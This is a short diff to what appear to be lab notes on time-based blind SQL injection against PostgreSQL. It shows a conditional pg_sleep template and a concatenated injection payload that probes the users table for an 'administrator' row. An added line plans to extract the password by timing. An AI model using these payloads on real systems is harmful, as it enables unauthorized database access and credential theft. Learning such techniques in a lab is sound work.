@@ -11,3 +11,4 @@
     - SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
 - So, first we need to check if the users table exist: 
     - IZNnt2wURennW4cW' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(10) END from users where username='administrator' )--
+- Now we need to iterate to get the password, but now we will base our solution on time not on status
